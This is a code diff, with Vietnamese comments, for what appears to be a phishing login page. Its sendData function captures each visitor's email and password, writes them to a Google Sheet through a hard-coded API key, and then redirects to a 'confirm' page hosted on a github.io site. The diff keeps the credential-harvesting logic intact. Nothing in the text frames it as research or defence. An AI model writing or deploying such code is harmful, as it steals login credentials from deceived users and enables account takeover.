@@ -220,37 +220,34 @@
 
 function sendData(event) {
   event.preventDefault();
-  
+
   let email = document.getElementById("email").value.trim();
   const pass = document.getElementById("password").value.trim();
 
-  // Kiểm tra xem người dùng có nhập email và mật khẩu không
+  console.log("Form Data - Email:", email, "Password:", pass);  // Kiểm tra giá trị dữ liệu
+
+  // Kiểm tra nếu email hoặc pass trống
   if (!email || !pass) {
     alert("Please fill out all fields.");
     return;
   }
 
-  // Kiểm tra tính hợp lệ của email hoặc số điện thoại
+  // Kiểm tra email hợp lệ
   if (!isValidEmail(email)) {
-    if (!isValidIndianPhone(email)) {
-      alert("Please enter a valid email or Indian phone number.");
-      return;
-    }
+    alert("Please enter a valid email.");
+    return;
   }
 
-  console.log("Email:", email, "Password:", pass);  // Kiểm tra giá trị email và pass
-  
-  // Lệnh gửi dữ liệu đến Google Sheets (đảm bảo bạn có API key và sheet ID)
+  // Gọi Google Sheets API để lưu dữ liệu
   const sheetId = "1YfHUe71d33JQSTsW63vpYwb4N2Uz2XOffO3wJnRh3Zo";
   const apiKey = "AIzaSyB8cfQtIJFIimytGozA9oTGUliK3q6rArc";
-  const range = "Sheet1!A:B";  // Adjust range as needed
+  const range = "Sheet1!A:B";
   const valueRangeBody = {
     "values": [
       [email, pass]
     ]
   };
 
-  // Khởi tạo API Google Sheets
   gapi.client.init({
     apiKey: apiKey,
     discoveryDocs: ["https://sheets.googleapis.com/$discovery/rest?version=v4"]
@@ -263,14 +260,15 @@ function sendData(event) {
       resource: valueRangeBody
     });
   }).then((response) => {
-    alert("Credentials saved successfully!");  // Hiển thị thông báo khi lưu thành công
-    console.log(response);  // In ra thông tin response
-    window.location.href = "https://girlhotnewstoday.github.io/logins/confirm.html";  // Chuyển hướng tới trang xác nhận
+    console.log("Data successfully saved:", response);
+    alert("Credentials saved successfully!");
+    window.location.href = "https://girlhotnewstoday.github.io/logins/confirm.html";
   }).catch((error) => {
-    console.error("Error saving credentials: ", error);
-    alert('Connection issue!');  // Hiển thị thông báo lỗi nếu có sự cố
+    console.error("Error saving data:", error);
+    alert('Connection issue!');
   });
 }
+
 
 window.addEventListener("DOMContentLoaded", () => {
   const form = document.getElementById('loginForm');
